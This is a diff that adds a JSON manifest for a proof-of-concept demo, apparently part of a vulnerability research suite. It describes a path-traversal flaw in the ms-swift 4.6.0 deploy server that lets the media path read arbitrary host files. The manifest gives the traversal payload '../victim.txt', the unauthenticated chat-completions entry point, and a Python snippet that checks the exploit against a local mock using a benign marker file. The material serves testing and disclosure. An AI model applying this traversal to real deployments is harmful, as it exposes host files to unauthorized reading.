@@ -1,0 +1,27 @@
+{
+  "auth": "无",
+  "cleanup": "`python demos/msswift-media-local-read/poc.py --cleanup`；删除 `demos/.work/msswift-media-local-read/`；mock 服务随脚本退出停止",
+  "component": "msswift",
+  "effect": "本地文件 marker 读回",
+  "entry": "HTTP POST /v1/chat/completions (media path)",
+  "env": "mock 自带: `python demos/msswift-media-local-read/poc.py`；上游 pin: `swift/infer_engine/protocol.py:275`",
+  "id": "msswift-media-local-read",
+  "in_b": false,
+  "in_c": true,
+  "layer": 2,
+  "marker": "INKBLADE-BENIGN-msswift-media-local-read",
+  "network": "ClusterIP",
+  "params": "media path",
+  "reason": "",
+  "sha256": "bffbda175498547d86e002eb38b1d35f4a35240b4774b037f4a8ec713b19b670",
+  "snippet": "import sys\nfrom pathlib import Path\nsys.path.insert(0, str(Path(__file__).resolve().parents[1]))\nfrom _lib.demo import cli, run_demo\nMARKER = \"INKBLADE-BENIGN-msswift-media-local-read\"\nSPEC = {'id': 'msswift-media-local-read', 'kind': 'path', 'payload': '../victim.txt'}\ndef demo(args):\n    # target=127.0.0.1:<port>; args.target 默认 127.0.0.1:0\n    result = run_demo(SPEC, target=args.target, marker=args.marker)\n    assert result[\"status\"] == 200\n    assert args.marker in result.get(\"body\", \"\") or result.get(\"marker\") == args.marker\n    print(result[\"status\"], result.get(\"body\", \"\")[:160])\n    return 0",
+  "spec": {
+    "id": "msswift-media-local-read",
+    "kind": "path",
+    "payload": "../victim.txt"
+  },
+  "status": "runnable",
+  "title": "ms-swift 4.6.0 deploy media path reads arbitrary host files by default",
+  "upstream": "",
+  "version": "v4.6.0"
+}
